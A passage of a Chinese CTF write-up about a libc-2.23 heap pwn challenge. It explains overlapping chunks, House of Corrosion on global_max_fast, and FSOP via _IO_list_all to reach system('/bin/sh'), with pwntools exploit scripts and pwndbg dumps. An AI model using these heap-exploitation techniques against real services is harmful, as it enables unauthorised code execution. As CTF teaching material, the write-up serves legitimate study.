class=\"number\">0x20</span> + p64(libc_base + libc.symbols[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>] - <span class=\"number\">0x30</span> + <span class=\"number\">8</span> - <span class=\"number\">3</span>)</span><br><span class=\"line\">edit(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 覆写fd指向fake chunk(__malloc_hook前)</span></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x90</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0xd1</span>) + p64(libc_base + libc.symbols[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>] - <span class=\"number\">0x30</span> )</span><br><span class=\"line\">alloc(<span class=\"number\">0x130</span>,payload) <span class=\"comment\"># 2</span></span><br><span class=\"line\"></span><br><span class=\"line\">alloc(<span class=\"number\">0xc0</span>,<span class=\"string\">&#x27;BBBB&#x27;</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 分配并修改malloc</span></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;A&#x27;</span> * <span class=\"number\">0x18</span> + p64(one_gadget_addr) + p64(libc_base + libc.symbols[<span class=\"string\">&quot;realloc&quot;</span>])</span><br><span class=\"line\">alloc(<span class=\"number\">0xc0</span>,payload) <span class=\"comment\"># 0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(fang,&#x27;b *(0x555555400000 + 0xAC9)&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># pause()</span></span><br><span class=\"line\">alloc2(<span class=\"number\">0x100</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">log.info(<span class=\"string\">&quot;elf_base : 0x%x&quot;</span> % elf_base)</span><br><span class=\"line\">log.info(<span class=\"string\">&quot;libc_base : 0x%x&quot;</span> % libc_base)</span><br><span class=\"line\">log.info(<span class=\"string\">&quot;heap_base : 0x%x&quot;</span> % heap_base)</span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\">fang.interactive()</span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class=\"line\"><span class=\"string\">constraints:</span></span><br><span class=\"line\"><span class=\"string\">  rax == NULL</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class=\"line\"><span class=\"string\">constraints:</span></span><br><span class=\"line\"><span class=\"string\">  [rsp+0x30] == NULL</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class=\"line\"><span class=\"string\">constraints:</span></span><br><span class=\"line\"><span class=\"string\">  [rsp+0x50] == NULL</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class=\"line\"><span class=\"string\">constraints:</span></span><br><span class=\"line\"><span class=\"string\">  [rsp+0x70] == NULL</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<p>第四届“长城杯”信息安全铁人三项赛初赛的唯一一题pwn，做的时候没想到0xdeadbeef写在哪，有点难蚌。</p>","more":"<p>保护全开，先逆向看下。</p>\n<p>64位菜单堆题，libc-2.23，没有show，edit也不能edit chunk，不过可以写bss段上的一点东西，可以轻易得到一个任意地址写<code>0xdeadbeef</code>；alloc 限制了 size &gt; 0x90 &amp;&amp; size &lt;= 0x2333，申请不到<code>fast bin chunk</code>，不过使用的是<code>malloc</code>，没有对申请的内存进行清理；free没有问题。</p>\n<p><img src=\"./%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9heap2019/1673449093269-1.png\" alt=\"img\"></p>\n<p>利用的是House of Corrosion，将0xdeadbeef调整偏移写到<code>global_max_fast</code>。<code>global_max_fast</code>是一个libc中的全局变量，表示最大的fastbin chunk的大小，默认为<code>0x80</code>，在没有初始化堆的情况下为<code>0</code>。</p>\n<p>改写<code>globla_max_fast</code>可以让程序将更大的chunk视作fast bin chunk，在malloc和free的时候将作为fast bin chunk处理。<code>fastbinsY</code>中有10个元素，存放大小从<code>0x20~0xb0</code>的chunk，当超出该范围的chunk进入<code>fastbinsY</code>时，就会发生<strong>数组越界</strong>。利用此方法我们可以向<code>fastbinsY</code>后面的内存中写入一个堆地址（通过free），也可以取出后面内存中指针指向的chunk（如果可以malloc该size的话）。</p>\n<p>偏移和要处理的<code>chunk size</code>可以用此式子计算：<code>chunk size = (address-fastbinsY)* 2 + 0x20</code>（这个size包括了<code>header</code>），其中<code>chunk size</code>是处理的<code>chunk</code>的<code>size</code>，<code>address</code>是会写入或<code>malloc</code>的地址，<code>fastbinsY</code>为<code>fastbinsY</code>的地址。</p>\n<p>一开始打算将<code>globla_max_fast</code>写为<code>0xdead</code>，通过free直接将堆地址写入<code>_IO_list_all</code>打FSOP，结果free后的chunk中只有<code>fd</code>字段有内容，其余部分的内容都被清空了。这是fast bin特有的吗？unsorted bin好像不会，之前没太注意。</p>\n<p>后面参考了下main的思路，也有了些想法。</p>\n<ol>\n<li><p>main的思路：<code>leak -&gt; 利用任意地址0xde构造overlapping -&gt; 利用任意地址写0xde增大global_max_fast -&gt; 利用overlapping修改fast bin chunk的fd配合任意地址写0xde实现任意地址分配 -&gt; 分配到__malloc_hook附近修改__malloc_hook</code>。</p>\n</li>\n<li><p>同main的思路，但是打<code>IO</code>：<code>leak -&gt; 利用任意地址0xde构造overlapping -&gt; 利用任意地址写0xde增大global_max_fast -&gt; 利用overlapping修改fast bin chunk的fd配合任意地址写0xde实现任意地址分配 -&gt; 分配到_IO_list_all/vtable附近伪造IO_FILE/vtable -&gt; 走exit到_IO_OVERFLOW</code>（未尝试过）。</p>\n</li>\n<li><p>借鉴main的思路，利用<code>House of Corrosion</code>打<code>IO</code>：<code>leak -&gt; 利用任意地址0xde构造overlapping -&gt; 利用任意地址写0xdead增大global_max_fast -&gt; 利用House of Corrosion劫持_IO_list_all -&gt; 利用overlapping伪造IO_FILE -&gt; 走exit到_IO_OVERFLOW</code>。</p>\n</li>\n</ol>\n<p>下面先按照3的思路写：</p>\n<h2 id=\"leak\"><a href=\"#leak\" class=\"headerlink\" title=\"leak\"></a>leak</h2><p>这题泄露地址挺简单的，输入<code>2019</code>就会返回<code>bss</code>中的<code>heap_list</code>，借此可以泄露出程序基地址。</p>\n<p>libc和heap地址泄露也不难，程序中<code>malloc</code>时不会清理原有数据，因此可以借助<code>unsorted bin chunk的fd和bk</code>泄露libcbase和heapbase。</p>\n<h2 id=\"overlapping\"><a href=\"#overlapping\" class=\"headerlink\" title=\"overlapping\"></a>overlapping</h2><p>首先利用任意地址写<code>0xdeadbeef</code>修改<code>size</code>来构造overlapping，这波遇到了之前没有遇到的问题，也算是有些收获。</p>\n<p>ptmalloc<strong>完全依靠<code>chunk</code>的<code>prev_size</code>和<code>size</code>两个字段来判断chunk的使用情况和对chunk的前后块进行定位</strong>，即使<code>prev_size</code>和<code>size</code>是有问题的，只要能通过检查就能正常执行。</p>\n<p>在这道题中就是如此，利用任意地址写<code>0xdeadbeef</code>可以伪造<code>chunk</code>的<code>size</code>为<code>0xde</code>，这个<code>size</code>在64位系统下是不正常的，因为64位系统下的<code>size</code>是<code>0x10</code>对齐的，正常情况下不会出现这样<code>size</code>的<code>chunk</code>，这个<code>size</code>的<code>chunk</code>也无法被申请或切割得到，但是在本次利用中，并没有针对对齐的检查，这个<code>size</code>的<code>chunk</code>是可以使用的（除了不能直接malloc）。</p>\n<p>那要如何利用任意地址写<code>0xdeadbeef</code>修改<code>size</code>来构造overlapping呢？**关键在于伪造<code>chunk</code>前后的<code>prev_size</code>和<code>size</code>**。ptmalloc定位<code>next chunk</code>的方法是<code>chunk + (size - flags)</code>，通过此式子在对应的位置写入合理的<code>prev_size</code>和<code>size</code>，保证<code>size==next_chunk-&gt;prev_size</code>和<code>chunk+size==next_chunk</code></p>\n<p>本题中通过修改<code>free</code>后<code>chunk</code>的<code>size</code>为<code>0xde</code>实现初步的overlapping，但这是不够的。由于这个<code>size</code>的特殊性，                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        不能直接申请出来，因此只能通过切割来获取能申请出来的<code>chunk</code>，而这个<code>chunk</code>最大也只有<code>0xb0</code>的大小（<code>last_remainder&gt;=MIN_SIZE</code>才会切割），但就算这个<code>chunk</code>原来申请时申请最小的大小，<code>size</code>也要到<code>0xa0</code>（<code>malloc(0x98)</code>的情况下），最多只能控制到正常情况下下一个<code>chunk</code>的<code>fd</code>和<code>bk</code>，对于伪造<code>IO_FILE</code>是不够的（调试的时候看到即使是打<code>__malloc_hook</code>也不够）</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/40gx 0x55bf8d2d10a0</span><br><span class=\"line\">0x55bf8d2d10a0:\t0xadbeef00000000a0\t0x00000000000000de &lt;- 伪造 <span class=\"built_in\">id</span>==1的chunk的size，原本为0xa1</span><br><span class=\"line\">0x55bf8d2d10b0:\t0x00007fd3f3138b78\t0x00007fd3f3138b78</span><br><span class=\"line\">0x55bf8d2d10c0:\t0x6262626262626262\t0x6262626262626262</span><br><span class=\"line\">0x55bf8d2d10d0:\t0x6262626262626262\t0x6262626262626262</span><br><span class=\"line\">0x55bf8d2d10e0:\t0x6262626262626262\t0x6262626262626262</span><br><span class=\"line\">0x55bf8d2d10f0:\t0x6262626262626262\t0x6262626262626262</span><br><span class=\"line\">0x55bf8d2d1100:\t0x6262626262626262\t0x6262626262626262</span><br><span class=\"line\">0x55bf8d2d1110:\t0x6262626262626262\t0x6262626262626262</span><br><span class=\"line\">0x55bf8d2d1120:\t0x6262626262626262\t0x6262626262626262</span><br><span class=\"line\">0x55bf8d2d1130:\t0x6262626262626262\t0x6262626262626262</span><br><span class=\"line\">0x55bf8d2d1140:\t0x00000000000000a0\t0x00000000000000a0 &lt;- <span class=\"built_in\">id</span>==2</span><br><span class=\"line\">0x55bf8d2d1150:\t0x6363636363636363\t0x6363636363636363 &lt;- 修改 size==de后可以堆叠到这里</span><br><span class=\"line\">0x55bf8d2d1160:\t0x6363636363636363\t0x6363636363636363</span><br><span class=\"line\">0x55bf8d2d1170:\t0x6363636363636363\t0x00000000000000d8</span><br><span class=\"line\">0x55bf8d2d1180:\t0x0000000000000061\t0x6363636363636363</span><br><span class=\"line\">0x55bf8d2d1190:\t0x6363636363636363\t0x6363636363636363</span><br><span class=\"line\">0x55bf8d2d11a0:\t0x6363636363636363\t0x6363636363636363</span><br><span class=\"line\">0x55bf8d2d11b0:\t0x6363636363636363\t0x6363636363636363</span><br><span class=\"line\">0x55bf8d2d11c0:\t0x6363636363636363\t0x6363636363636363</span><br><span class=\"line\">0x55bf8d2d11d0:\t0x6363636363636363\t0x6363636363636363</span><br><span class=\"line\">pwndbg&gt; x/10gx 0x55bf8bcdd040</span><br><span class=\"line\">0x55bf8bcdd040:\t0x000055bf8d2d1010\t0x0000000000000000 &lt;- heap_list</span><br><span class=\"line\">0x55bf8bcdd050:\t0x000055bf8d2d1150\t0x000055bf8d2d11f0</span><br><span class=\"line\">0x55bf8bcdd060:\t0x000055bf8d2d2600\t0x0000000000000000</span><br></pre></td></tr></table></figure>\n\n<p>因此，我们要借助这个初步的overlapping得到更大范围的overlapping。由于我们可以控制到正常情况下，下一个<code>chunk</code>的<code>fd</code>和<code>bk</code>，那我们自然也可以控制其<code>prev_size</code>和<code>size</code>来再次实现overlapping，并且这次构造的<code>prev_size</code>和<code>size</code>的值可以由我们自行控制，我们甚至可以构造一个完整包含下一（几）个<code>chunk</code>的<code>size</code>，不过注意要在对应地方伪造<code>next_chunk-&gt;prev_size</code>。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/30gx 0x563da84b90a0</span><br><span class=\"line\">0x563da84b90a0:\t0xadbeef00000000a0\t0x00000000000000b1 &lt;- <span class=\"built_in\">id</span>==1</span><br><span class=\"line\">0x563da84b90b0:\t0x4141414141414141\t0x4141414141414141</span><br><span class=\"line\">0x563da84b90c0:\t0x4141414141414141\t0x4141414141414141</span><br><span class=\"line\">0x563da84b90d0:\t0x4141414141414141\t0x4141414141414141</span><br><span class=\"line\">0x563da84b90e0:\t0x4141414141414141\t0x4141414141414141</span><br><span class=\"line\">0x563da84b90f0:\t0x4141414141414141\t0x4141414141414141</span><br><span class=\"line\">0x563da84b9100:\t0x4141414141414141\t0x4141414141414141</span><br><span class=\"line\">0x563da84b9110:\t0x4141414141414141\t0x4141414141414141</span><br><span class=\"line\">0x563da84b9120:\t0x4141414141414141\t0x4141414141414141</span><br><span class=\"line\">0x563da84b9130:\t0x4141414141414141\t0x4141414141414141</span><br><span class=\"line\">0x563da84b9140:\t0x0000000000000000\t0x00000000000014b1 &lt;- 伪造 <span class=\"built_in\">id</span>==2的chunk的size，原本为0xa0</span><br><span class=\"line\">0x563da84b9150:\t0x6363636363636363\t0x0000000000000029 &lt;- 切割后chunk的位置</span><br><span class=\"line\">0x563da84b9160:\t0x00007f50b666db78\t0x00007f50b666db78</span><br><span class=\"line\">0x563da84b9170:\t0x6363636363636363\t0x0000000000000028</span><br><span class=\"line\">0x563da84b9180:\t0x0000000000000061\t0x6363636363636363</span><br><span class=\"line\">0x563da84b9190:\t0x6363636363636363\t0x6363636363636363</span><br><span class=\"line\">0x563da84b91a0:\t0x6363636363636363\t0x6363636363636363</span><br><span class=\"line\">0x563da84b91b0:\t0x6363636363636363\t0x6363636363636363</span><br><span class=\"line\">0x563da84b91c0:\t0x6363636363636363\t0x6363636363636363</span><br><span class=\"line\">0x563da84b91d0:\t0x6363636363636363\t0x6363636363636363</span><br><span class=\"line\">0x563da84b91e0:\t0x00000000000000a0\t0x0000000000001411  &lt;- <span class=\"built_in\">id</span>==1</span><br><span class=\"line\">0x563da84b91f0:\t0x6464646464646464\t0x6464646464646464</span><br><span class=\"line\">0x563da84b9200:\t0x6464646464646464\t0x6464646464646464</span><br><span class=\"line\">pwndbg&gt; x/10gx 0x563da7d62040</span><br><span class=\"line\">0x563da7d62040:\t0x0000563da84b9010\t0x0000563da84b90b0 &lt;- heap_list</span><br><span class=\"line\">0x563da7d62050:\t0x0000563da84b9150\t0x0000563da84b91f0</span><br><span class=\"line\">0x563da7d62060:\t0x0000563da84ba600\t0x0000000000000000</span><br></pre></td></tr></table></figure>\n\n<p>这里我选择的是构造完整包含下一个<code>chunk</code>的<code>size</code>，至此我们构造的overlapping已经足够了。</p>\n<h2 id=\"House-of-Corrision\"><a href=\"#House-of-Corrision\" class=\"headerlink\" title=\"House of Corrision\"></a>House of Corrision</h2><p><code>House of Corrosion</code>是一个很早的利用，<strong>通过改写全局变量<code>global_max_fast</code>来扩大fast bin chunk的大小范围，以此来实现对fastbinsY的数组越界利用</strong>，可以做到越界申请内存或写入一个堆地址。</p>\n<p>偏移和要处理的<code>chunk size</code>可以用此式子计算：<code>chunk size = (address-fastbinsY)* 2 + 0x20</code>（这个size包括了<code>header</code>），其中<code>chunk size</code>是处理的<code>chunk</code>的<code>size</code>，<code>address</code>是会写入或<code>malloc</code>的地址，<code>fastbinsY</code>为<code>fastbinsY</code>的地址。</p>\n<p>此处利用任意地址写<code>0xdead</code>来修改<code>global_max_fast</code>的大小，之后利用<code>free</code>将一个堆地址写到<code>_IO_list_all</code>来劫持<code>IO</code>流。被写的这个堆地址指向的<code>chunk</code>就是之前overlapping构造好的<code>chunk</code>，因此<code>size</code>需要提前计算好并设置。</p>\n<h2 id=\"FSOP\"><a href=\"#FSOP\" class=\"headerlink\" title=\"FSOP\"></a>FSOP</h2><p>劫持<code>_IO_list_all</code>后就可以伪造一个<code>IO_FILE</code>结构体，并伪造其<code>vtable</code>（glibc-2.23没有对<code>vtable</code>的合法性检查），程序里面有<code>exit</code>的功能，会调用<code>exit()</code>，因此这里选择的是走<code>exit() -&gt; ... -&gt;  _IO_flush_all_lockp() -&gt; _IO_OVERFLOW</code>的链。</p>\n<p>为此伪造的IO_FILE需要满足以下条件：</p>\n<ol>\n<li><code>fp-&gt;_mode&lt;=0</code></li>\n<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>\n</ol>\n<p>伪造<code>_flags=&quot;/bin/sh\\x00&quot;</code>，<code>vtable</code>中的<code>_IO_OVERFLOW=system</code>，当调用<code>exit()</code>时就会一路调用到<code>system(&quot;/bin/sh\\x00&quot;)</code>。</p>\n<p>伪造的<code>IO</code>如下：</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># construct fake io</span></span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(sys_addr)+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x70</span></span><br><span class=\"line\">fake_io=<span class=\"string\">&quot;/bin/sh\\x00&quot;</span>+p64(<span class=\"number\">0x1411</span>)</span><br><span class=\"line\">fake_io+=p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(<span class=\"number\">1</span>)+p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">fake_io=fake_io.ljust(<span class=\"number\">0xd8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_io+=p64(heapbase+<span class=\"number\">0x150</span>) <span class=\"comment\"># vtable</span></span><br><span class=\"line\">payload+=fake_io</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">length,content</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;4.exit\\n&quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Content length:\\n&quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(length))</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Content:&quot;</span>)</span><br><span class=\"line\">  s(<span class=\"built_in\">str</span>(content))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;4.exit\\n&quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Content id:\\n&quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">addr</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;4.exit\\n&quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Comment:\\n&quot;</span>)</span><br><span class=\"line\">  s(addr)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_heap_addr</span>():</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;4.exit\\n&quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&quot;2019&quot;</span>)</span><br><span class=\"line\">  heap_list=ru(<span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\">  heap_list=<span class=\"built_in\">int</span>(heap_list[<span class=\"number\">2</span>:],<span class=\"number\">16</span>)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> heap_list</span><br><span class=\"line\"></span><br><span class=\"line\">heap_list=get_heap_addr()</span><br><span class=\"line\">elfbase=heap_list-<span class=\"number\">0x202040</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x98</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x98</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\">add(<span class=\"number\">0x98</span>,<span class=\"string\">&#x27;b&#x27;</span>*<span class=\"number\">0x98</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x98</span>,<span class=\"string\">&quot;aaaaaaaa&quot;</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\">ru(<span class=\"string\">&quot;aaaaaaaa&quot;</span>)</span><br><span class=\"line\">libcbase=uu64(ru(<span class=\"string\">&quot;\\x7f&quot;</span>))-<span class=\"number\">3951480</span> </span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x98</span>,<span class=\"string\">&#x27;c&#x27;</span>*<span class=\"number\">0x98</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\">add(<span class=\"number\">0x98</span>,<span class=\"string\">&#x27;d&#x27;</span>*<span class=\"number\">0x98</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\">add(<span class=\"number\">0x98</span>,<span 